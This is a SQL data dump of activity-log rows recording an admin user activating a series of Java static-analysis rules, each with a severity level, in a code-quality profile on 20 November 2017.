INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3949, '2017-11-20 13:05:41.303', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMm3bbGRdfPp-rbR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3950, '2017-11-20 13:05:41.33', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMnSbbGRdfPp-rbS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3951, '2017-11-20 13:05:41.347', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMnjbbGRdfPp-rbT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3952, '2017-11-20 13:05:41.363', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMnzbbGRdfPp-rbU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3953, '2017-11-20 13:05:41.386', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMoKbbGRdfPp-rbV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3954, '2017-11-20 13:05:41.415', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMonbbGRdfPp-rbW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3955, '2017-11-20 13:05:41.437', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMo9bbGRdfPp-rbX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3956, '2017-11-20 13:05:41.478', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMpmbbGRdfPp-rbY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3957, '2017-11-20 13:05:41.52', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMqQbbGRdfPp-rbZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3958, '2017-11-20 13:05:41.547', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMqrbbGRdfPp-rba');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3959, '2017-11-20 13:05:41.585', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMrRbbGRdfPp-rbb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3960, '2017-11-20 13:05:41.609', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMrpbbGRdfPp-rbc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3961, '2017-11-20 13:05:41.627', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMr7bbGRdfPp-rbd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3962, '2017-11-20 13:05:41.642', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMsKbbGRdfPp-rbe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3963, '2017-11-20 13:05:41.665', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMshbbGRdfPp-rbf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3964, '2017-11-20 13:05:41.685', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMs1bbGRdfPp-rbg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3965, '2017-11-20 13:05:41.709', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMtNbbGRdfPp-rbh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3966, '2017-11-20 13:05:41.734', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMtmbbGRdfPp-rbi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3967, '2017-11-20 13:05:41.761', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMuBbbGRdfPp-rbj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3968, '2017-11-20 13:05:41.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMuabbGRdfPp-rbk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3969, '2017-11-20 13:05:41.813', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMu1bbGRdfPp-rbl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3970, '2017-11-20 13:05:41.832', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMvIbbGRdfPp-rbm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3971, '2017-11-20 13:05:41.856', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMvgbbGRdfPp-rbn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3972, '2017-11-20 13:05:41.894', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMwGbbGRdfPp-rbo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3973, '2017-11-20 13:05:41.921', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMwhbbGRdfPp-rbp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3974, '2017-11-20 13:05:41.947', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMw7bbGRdfPp-rbq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3975, '2017-11-20 13:05:41.972', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMxUbbGRdfPp-rbr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3976, '2017-11-20 13:05:41.997', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMxtbbGRdfPp-rbs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3977, '2017-11-20 13:05:42.025', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMyJbbGRdfPp-rbt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3978, '2017-11-20 13:05:42.058', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMyqbbGRdfPp-rbu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3979, '2017-11-20 13:05:42.093', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMzMbbGRdfPp-rbv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3980, '2017-11-20 13:05:42.136', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMz4bbGRdfPp-rbw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3981, '2017-11-20 13:05:42.165', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM0VbbGRdfPp-rbx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3982, '2017-11-20 13:05:42.188', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM0sbbGRdfPp-rby');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3983, '2017-11-20 13:05:42.204', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM08bbGRdfPp-rbz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3984, '2017-11-20 13:05:42.23', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM1WbbGRdfPp-rb0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3985, '2017-11-20 13:05:42.258', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM1ybbGRdfPp-rb1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3986, '2017-11-20 13:05:42.284', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM2MbbGRdfPp-rb2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3987, '2017-11-20 13:05:42.301', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM2dbbGRdfPp-rb3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3988, '2017-11-20 13:05:42.325', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM21bbGRdfPp-rb4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3989, '2017-11-20 13:05:42.343', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM3HbbGRdfPp-rb5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3990, '2017-11-20 13:05:42.367', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM3fbbGRdfPp-rb6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3991, '2017-11-20 13:05:42.405', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM4FbbGRdfPp-rb7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3992, '2017-11-20 13:05:42.502', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM5mbbGRdfPp-rb8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3993, '2017-11-20 13:05:42.63', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM7mbbGRdfPp-rb9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3994, '2017-11-20 13:05:42.691', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM8jbbGRdfPp-rb-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3995, '2017-11-20 13:05:42.791', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiM-HbbGRdfPp-rb_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3996, '2017-11-20 13:05:42.948', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNAkbbGRdfPp-rcA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3997, '2017-11-20 13:05:42.987', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNBLbbGRdfPp-rcB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3998, '2017-11-20 13:05:43.022', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNBubbGRdfPp-rcC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3999, '2017-11-20 13:05:43.047', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNCHbbGRdfPp-rcD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4000, '2017-11-20 13:05:43.087', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNCvbbGRdfPp-rcE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4001, '2017-11-20 13:05:43.121', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNDRbbGRdfPp-rcF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4002, '2017-11-20 13:05:43.155', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNDzbbGRdfPp-rcG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4003, '2017-11-20 13:05:43.189', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNEVbbGRdfPp-rcH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4004, '2017-11-20 13:05:43.226', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNE6bbGRdfPp-rcI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4005, '2017-11-20 13:05:43.284', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNF0bbGRdfPp-rcJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4006, '2017-11-20 13:05:43.308', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNGMbbGRdfPp-rcK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4007, '2017-11-20 13:05:43.34', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNGsbbGRdfPp-rcL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4008, '2017-11-20 13:05:43.359', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNG_bbGRdfPp-rcM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4009, '2017-11-20 13:05:43.381', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNHVbbGRdfPp-rcN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4010, '2017-11-20 13:05:43.404', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNHsbbGRdfPp-rcO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4011, '2017-11-20 13:05:43.422', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNH-bbGRdfPp-rcP');
